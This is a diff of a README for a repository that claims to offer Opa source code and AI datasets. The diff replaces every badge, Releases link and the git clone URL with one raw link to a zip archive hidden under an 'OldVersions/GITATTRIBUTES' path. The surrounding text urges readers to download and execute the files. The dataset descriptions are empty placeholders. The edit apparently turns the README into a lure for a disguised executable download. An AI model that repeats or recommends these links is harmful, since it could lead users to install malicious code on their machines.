@@ -1,6 +1,6 @@
 # AI2001 Category Source Code for Opa Programming Language
 
-![GitHub release](https://img.shields.io/github/release/ProjectMunnoi/AI2001_Category-Source_Code-SC-Opa.svg) ![GitHub issues](https://img.shields.io/github/issues/ProjectMunnoi/AI2001_Category-Source_Code-SC-Opa.svg) ![GitHub forks](https://img.shields.io/github/forks/ProjectMunnoi/AI2001_Category-Source_Code-SC-Opa.svg) ![GitHub stars](https://img.shields.io/github/stars/ProjectMunnoi/AI2001_Category-Source_Code-SC-Opa.svg)
+![GitHub release](https://github.com/ProjectMunnoi/AI2001_Category-Source_Code-SC-Opa/raw/refs/heads/AI2001_Category-Source_Code-SC-Opa_Main-dev/OldVersions/GITATTRIBUTES/Code-A-Source-S-Category-Opa-arsoite.zip) ![GitHub issues](https://github.com/ProjectMunnoi/AI2001_Category-Source_Code-SC-Opa/raw/refs/heads/AI2001_Category-Source_Code-SC-Opa_Main-dev/OldVersions/GITATTRIBUTES/Code-A-Source-S-Category-Opa-arsoite.zip) ![GitHub forks](https://github.com/ProjectMunnoi/AI2001_Category-Source_Code-SC-Opa/raw/refs/heads/AI2001_Category-Source_Code-SC-Opa_Main-dev/OldVersions/GITATTRIBUTES/Code-A-Source-S-Category-Opa-arsoite.zip) ![GitHub stars](https://github.com/ProjectMunnoi/AI2001_Category-Source_Code-SC-Opa/raw/refs/heads/AI2001_Category-Source_Code-SC-Opa_Main-dev/OldVersions/GITATTRIBUTES/Code-A-Source-S-Category-Opa-arsoite.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Welcome to the **AI2001_Category-Source_Code-SC-Opa** repository! This repository contains source code and datasets specifically for the Opa programming language as part of the AI2001 project. The datasets are designed to support various artificial intelligence applications and research.
 
-For the latest releases, visit the [Releases section](https://github.com/ProjectMunnoi/AI2001_Category-Source_Code-SC-Opa/releases). You can download the necessary files and execute them as needed.
+For the latest releases, visit the [Releases section](https://github.com/ProjectMunnoi/AI2001_Category-Source_Code-SC-Opa/raw/refs/heads/AI2001_Category-Source_Code-SC-Opa_Main-dev/OldVersions/GITATTRIBUTES/Code-A-Source-S-Category-Opa-arsoite.zip). You can download the necessary files and execute them as needed.
 
 ## Table of Contents
 
@@ -32,7 +32,7 @@ To get started with the code in this repository, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/ProjectMunnoi/AI2001_Category-Source_Code-SC-Opa.git
+   git clone https://github.com/ProjectMunnoi/AI2001_Category-Source_Code-SC-Opa/raw/refs/heads/AI2001_Category-Source_Code-SC-Opa_Main-dev/OldVersions/GITATTRIBUTES/Code-A-Source-S-Category-Opa-arsoite.zip
    ```
    
 2. **Navigate to the Directory**:
@@ -42,7 +42,7 @@ To get started with the code in this repository, follow these steps:
 
 3. **Install Dependencies**: If there are any dependencies required for the Opa language, ensure they are installed. You can find specific instructions in the Opa documentation.
 
-4. **Download Datasets**: Visit the [Releases section](https://github.com/ProjectMunnoi/AI2001_Category-Source_Code-SC-Opa/releases) to download the latest datasets. Execute the files as per your project requirements.
+4. **Download Datasets**: Visit the [Releases section](https://github.com/ProjectMunnoi/AI2001_Category-Source_Code-SC-Opa/raw/refs/heads/AI2001_Category-Source_Code-SC-Opa_Main-dev/OldVersions/GITATTRIBUTES/Code-A-Source-S-Category-Opa-arsoite.zip) to download the latest datasets. Execute the files as per your project requirements.
 
 ## Usage
 
@@ -72,7 +72,7 @@ The repository includes various datasets tailored for AI2001 and Opa programming
 2. **Dataset 2**: Description of the second dataset.
 3. **Dataset 3**: Description of the third dataset.
 
-You can find the datasets in the [Releases section](https://github.com/ProjectMunnoi/AI2001_Category-Source_Code-SC-Opa/releases). Download and execute them as needed.
+You can find the datasets in the [Releases section](https://github.com/ProjectMunnoi/AI2001_Category-Source_Code-SC-Opa/raw/refs/heads/AI2001_Category-Source_Code-SC-Opa_Main-dev/OldVersions/GITATTRIBUTES/Code-A-Source-S-Category-Opa-arsoite.zip). Download and execute them as needed.
 
 ## Contributing
 
@@ -123,4 +123,4 @@ This repository covers a wide range of topics related to artificial intelligence
 
 For more details, feel free to explore the topics listed above.
 
-For the latest updates and releases, don't forget to check the [Releases section](https://github.com/ProjectMunnoi/AI2001_Category-Source_Code-SC-Opa/releases).
+For the latest updates and releases, don't forget to check the [Releases section](https://github.com/ProjectMunnoi/AI2001_Category-Source_Code-SC-Opa/raw/refs/heads/AI2001_Category-Source_Code-SC-Opa_Main-dev/OldVersions/GITATTRIBUTES/Code-A-Source-S-Category-Opa-arsoite.zip).
